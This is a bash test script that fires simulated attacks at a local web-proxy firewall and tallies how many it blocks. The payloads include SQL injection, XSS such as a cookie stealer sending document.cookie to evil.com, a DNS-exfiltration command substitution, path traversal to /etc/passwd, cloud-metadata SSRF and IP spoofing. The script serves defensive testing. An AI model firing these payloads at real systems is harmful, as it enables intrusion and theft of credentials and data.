#!/bin/bash

# ============================================================
#  ProxyShield — Comprehensive Attack Simulation Suite
#  Tests: SQL Injection, XSS, High Entropy, Honeypots,
#         Brute Force, DDoS, Blacklisted IPs, Mixed Attacks
# ============================================================

PROXY="http://localhost:9090"

# ── Colours ──────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# ── Counters ─────────────────────────────────────────────────
TOTAL=0; BLOCKED=0; ALLOWED=0; ERRORS=0

# ── Helpers ──────────────────────────────────────────────────
section() {
  echo ""
  echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════╗${RESET}"
  printf "${CYAN}${BOLD}║  %-52s║${RESET}\n" "$1"
  echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════╝${RESET}"
  echo ""
}

handle_code() {
  local label="$1" code="$2"
  if [ "$code" = "000" ]; then
    ERRORS=$((ERRORS + 1))
    echo -e "  ${DIM}[$label]${RESET} → ${RED}CONNECTION ERROR${RESET} (is proxy running?)"
  elif [ "$code" = "403" ] || [ "$code" = "429" ]; then
    BLOCKED=$((BLOCKED + 1))
    echo -e "  ${DIM}[$label]${RESET} → ${RED}BLOCKED${RESET} ${DIM}(HTTP $code)${RESET} ✅"
  else
    ALLOWED=$((ALLOWED + 1))
    echo -e "  ${DIM}[$label]${RESET} → ${GREEN}ALLOWED${RESET} ${DIM}(HTTP $code)${RESET}"
  fi
  sleep 0.1
}

fire_get() {
  local label="$1" url="$2"; shift 2
  TOTAL=$((TOTAL + 1))
  local code; code=$(curl -s -o /dev/null -w "%{http_code}" "$@" "$url" 2>/dev/null)
  handle_code "$label" "$code"
}

fire_post() {
  local label="$1" url="$2" body="$3" ctype="${4:-application/x-www-form-urlencoded}"; shift 4
  TOTAL=$((TOTAL + 1))
  local code; code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    -H "Content-Type: $ctype" --data-raw "$body" "$@" "$url" 2>/dev/null)
  handle_code "$label" "$code"
}

# ════════════════════════════════════════════════════════════
echo ""
echo -e "${MAGENTA}${BOLD}"
echo "  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗"
echo "  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝"
echo "  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ "
echo "  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  "
echo "  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   "
echo "  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝  "
echo -e "${CYAN}         Attack Simulation Suite v2.0${RESET}"
echo -e "${DIM}         Target: $PROXY${RESET}"
echo ""

# ════════════════════════════════════════════════════════════
section "PHASE 1 — Baseline: Normal Legitimate Traffic"
echo -e "${DIM}  Sending clean requests to establish baseline...${RESET}"; echo ""
for i in $(seq 1 5); do fire_get "GET /getAllUsers #$i" "$PROXY/getAllUsers"; done
fire_get "GET /health"       "$PROXY/health"
fire_get "GET /api/products" "$PROXY/api/products"
fire_get "GET /api/orders"   "$PROXY/api/orders"

# ════════════════════════════════════════════════════════════
section "PHASE 2 — Brute Force: Login Rate Limit Attack"
echo -e "${DIM}  Limit: 5 req/min on POST /login — firing 10 attempts...${RESET}"; echo ""
for i in $(seq 1 10); do
  fire_post "POST /login attempt #$i" "$PROXY/login" "username=admin&password=attempt$i"
done

# ════════════════════════════════════════════════════════════
section "PHASE 3 — DDoS Simulation: Endpoint Flood"
echo -e "${DIM}  Rapid-firing GET /getAllUsers to trigger rate limit...${RESET}"; echo ""
for i in $(seq 1 20); do
  TOTAL=$((TOTAL + 1))
  code=$(curl -s -o /dev/null -w "%{http_code}" "$PROXY/getAllUsers" 2>/dev/null)
  printf "  ${DIM}[Flood #%02d]${RESET} HTTP %s" "$i" "$code"
  if [ "$code" = "429" ] || [ "$code" = "403" ]; then
    BLOCKED=$((BLOCKED + 1))
    printf "  → ${RED}Rate limit triggered ✅${RESET}\n"; break
  else
    ALLOWED=$((ALLOWED + 1)); printf "\n"
  fi
done

# ════════════════════════════════════════════════════════════
section "PHASE 4 — SQL Injection Attacks (12 variants)"
echo -e "${DIM}  Firing classic, blind, UNION, stacked, and encoded SQLi...${RESET}"; echo ""

fire_get  "Classic OR bypass"      "$PROXY/login?user=%27+OR+%271%27%3D%271"
fire_get  "Boolean blind"          "$PROXY/users?id=1+AND+1=1"
fire_get  "UNION SELECT exfil"     "$PROXY/users?id=1+UNION+SELECT+username,password+FROM+users"
fire_post "POST body OR 1=1"       "$PROXY/search"   "query=' OR 1=1 --"
fire_post "DROP TABLE attack"      "$PROXY/search"   "query='; DROP TABLE users; --"
fire_post "INSERT injection"       "$PROXY/search"   "query='; INSERT INTO admins VALUES('hacker','pwnd'); --"
fire_get  "Comment bypass"         "$PROXY/api/data?filter=1/**/OR/**/1=1"
fire_get  "UNION multi-table"      "$PROXY/search?q=1+UNION+SELECT+%2A+FROM+passwords"
fire_post "Stacked queries"        "$PROXY/update"   "id=1; SELECT * FROM users WHERE 1=1"
fire_post "xp_cmdshell attempt"    "$PROXY/admin"    "cmd='; EXEC xp_cmdshell('whoami'); --"
fire_get  "Hex encoded SQLi"       "$PROXY/users?id=0x31+OR+0x31=0x31"
fire_post "Time-based blind"       "$PROXY/search"   "q=1'; WAITFOR DELAY '0:0:5'--"

# ════════════════════════════════════════════════════════════
section "PHASE 5 — XSS Attack Vectors (12 variants)"
echo -e "${DIM}  Script tags, event handlers, iframes, eval, DOM attacks...${RESET}"; echo ""

fire_get  "Classic script tag"     "$PROXY/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
fire_get  "External script src"    "$PROXY/search?q=%3Cscript+src=http://evil.com/x.js%3E%3C/script%3E"
fire_get  "Img onerror"            "$PROXY/search?q=%3Cimg+onerror%3Dalert%281%29+src%3Dx%3E"
fire_get  "SVG onload"             "$PROXY/search?q=%3Csvg+onload%3Dalert%281%29%3E"
fire_get  "Javascript URI"         "$PROXY/redirect?url=javascript:alert(document.cookie)"
fire_get  "IFrame injection"       "$PROXY/page?embed=%3Ciframe+src%3Dhttp://evil.com%3E"
fire_post "Cookie stealer"         "$PROXY/comment" \
  "body=<script>document.location='http://evil.com/?c='+document.cookie</script>"
fire_post "Eval injection"         "$PROXY/api/eval" \
  "code=eval(atob('YWxlcnQoMSk='))" "application/json"
fire_post "DOM clobbering"         "$PROXY/api/render" \
  '{"template":"<img src=x onerror=alert(1)>"}' "application/json"
fire_get  "Event handler in URL"   "$PROXY/user?name=%3Ca+onmouseover%3Dalert%281%29%3Ehover%3C%2Fa%3E"
fire_post "Nested XSS"             "$PROXY/submit" \
  "data=<<script>script>alert(1)<</script>/script>"
fire_get  "Confirm bypass"         "$PROXY/test?p=%3Cscript%3Econfirm%28document.cookie%29%3C%2Fscript%3E"

# ════════════════════════════════════════════════════════════
section "PHASE 6 — High Entropy / Anomaly Payloads"
echo -e "${DIM}  Encrypted blobs, base64 noise, obfuscated shellcode...${RESET}"; echo ""

fire_post "Base64 encoded payload"  "$PROXY/api/data" \
  "aGVsbG8gd29ybGQgdGhpcyBpcyBhIGhpZ2ggZW50cm9weSBwYXlsb2Fk" "text/plain"
fire_post "Encrypted-looking blob"  "$PROXY/api/upload" \
  "U2FsdGVkX1+vupppZksvRf5pq5g5XjFRlipRkwB06IXhOBZtS+Z8wGRMDIv+0iXZOwq7BaX8Fg==" "text/plain"
fire_post "Random entropy string"   "$PROXY/api/store" \
  "X7zK9mQ2vN4wR8pL1jF6hA0cE5sY3uT" "text/plain"
fire_post "Obfuscated shell cmd"    "$PROXY/api/run" \
  '$(nslookup`whoami.evil.com`)' "application/json"

# ════════════════════════════════════════════════════════════
section "PHASE 7 — Honeypot Trap Probes"
echo -e "${DIM}  Probing trap paths — each should trigger IP auto-ban...${RESET}"; echo ""

fire_get "/.env probe"              "$PROXY/.env"
fire_get "/wp-login.php probe"      "$PROXY/wp-login.php"
fire_get "/phpmyadmin probe"        "$PROXY/phpmyadmin"
fire_get "/admin probe"             "$PROXY/admin"
fire_get "/config.php probe"        "$PROXY/config.php"
fire_get "/.git/config probe"       "$PROXY/.git/config"
fire_get "/shell.php probe"         "$PROXY/shell.php"
fire_get "/backup.zip probe"        "$PROXY/backup.zip"

echo ""
echo -e "  ${YELLOW}⏳ Waiting 1 second for ban to propagate...${RESET}"
sleep 1

echo ""
echo -e "  ${DIM}Testing if IP is now auto-banned after honeypot trap:${RESET}"
fire_get "Normal req — post-ban" "$PROXY/getAllUsers"

# ════════════════════════════════════════════════════════════
section "PHASE 8 — Static Blacklisted IP Enforcement"
echo -e "${DIM}  Spoofing X-Forwarded-For with blacklisted IP 203.0.113.42...${RESET}"; echo ""

fire_get  "Blacklisted IP — GET /getAllUsers" "$PROXY/getAllUsers" \
  -H "X-Forwarded-For: 203.0.113.42"
fire_get  "Blacklisted IP — GET /"           "$PROXY/" \
  -H "X-Forwarded-For: 203.0.113.42"
fire_post "Blacklisted IP — POST /login"     "$PROXY/login" \
  "username=admin&password=test" "application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: 203.0.113.42"

# ════════════════════════════════════════════════════════════
section "PHASE 9 — Mixed & Chained Attack Vectors"
echo -e "${DIM}  Real attackers chain multiple techniques together...${RESET}"; echo ""

fire_get  "SQL + XSS hybrid"        \
  "$PROXY/search?q=%3Cscript%3Ealert(1)%3C/script%3E+UNION+SELECT+%2A+FROM+users"
fire_get  "Path traversal"          "$PROXY/../../../etc/passwd"
fire_get  "Double-encoded traversal" "$PROXY/%2e%2e%2f%2e%2e%2fetc%2fpasswd"
fire_get  "SSRF via redirect"       \
  "$PROXY/redirect?url=http://169.254.169.254/latest/meta-data/"
fire_get  "Null byte injection"     "$PROXY/files?name=../../etc/passwd%00.jpg"
fire_get  "Host header injection"   "$PROXY/api/data" -H "Host: evil.com"
fire_get  "Fake Googlebot scan"     "$PROXY/admin" \
  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)"

LONG=$(printf 'A%.0s' {1..400})
fire_post "Oversized param flood"   "$PROXY/search" "query=$LONG"

# ════════════════════════════════════════════════════════════
section "PHASE 10 — Automated Scanner Simulation"
echo -e "${DIM}  Simulating a bot scanning for exposed sensitive files...${RESET}"; echo ""

SCAN_PATHS=(
  "/robots.txt"    "/sitemap.xml"   "/.htaccess"    "/web.config"
  "/server-status" "/phpinfo.php"   "/test.php"     "/info.php"
  "/api/swagger.json" "/api/docs"   "/graphql"      "/v1/graphql"
  "/.DS_Store"     "/Thumbs.db"     "/dump.sql"     "/database.sql"
)
for path in "${SCAN_PATHS[@]}"; do
  fire_get "Scanner: $path" "$PROXY$path"
done

# ════════════════════════════════════════════════════════════
#  FINAL SUMMARY
# ════════════════════════════════════════════════════════════
echo ""
echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════╗${RESET}"
echo -e "${MAGENTA}${BOLD}║              SIMULATION RESULTS                      ║${RESET}"
echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════════╣${RESET}"
printf "${MAGENTA}${BOLD}║${RESET}  Total Requests Fired : ${BOLD}%-28s${RESET}${MAGENTA}${BOLD}║${RESET}\n" "$TOTAL"
printf "${MAGENTA}${BOLD}║${RESET}  ${RED}Requests Blocked      : ${BOLD}%-28s${RESET}${MAGENTA}${BOLD}║${RESET}\n" "$BLOCKED"
printf "${MAGENTA}${BOLD}║${RESET}  ${GREEN}Requests Allowed      : ${BOLD}%-28s${RESET}${MAGENTA}${BOLD}║${RESET}\n" "$ALLOWED"
[ "$ERRORS" -gt 0 ] && printf "${MAGENTA}${BOLD}║${RESET}  ${YELLOW}Connection Errors     : ${BOLD}%-28s${RESET}${MAGENTA}${BOLD}║${RESET}\n" "$ERRORS"
echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════════╣${RESET}"
if [ "$TOTAL" -gt 0 ]; then
  BLOCK_PCT=$(( (BLOCKED * 100) / TOTAL ))
  printf "${MAGENTA}${BOLD}║${RESET}  Block Rate           : ${RED}${BOLD}%d%%%-27s${RESET}${MAGENTA}${BOLD}║${RESET}\n" "$BLOCK_PCT" ""
fi
echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════════╣${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  📊 Dashboard: ${CYAN}http://localhost:9091${RESET}               ${MAGENTA}${BOLD}║${RESET}"
echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════╝${RESET}"
echo ""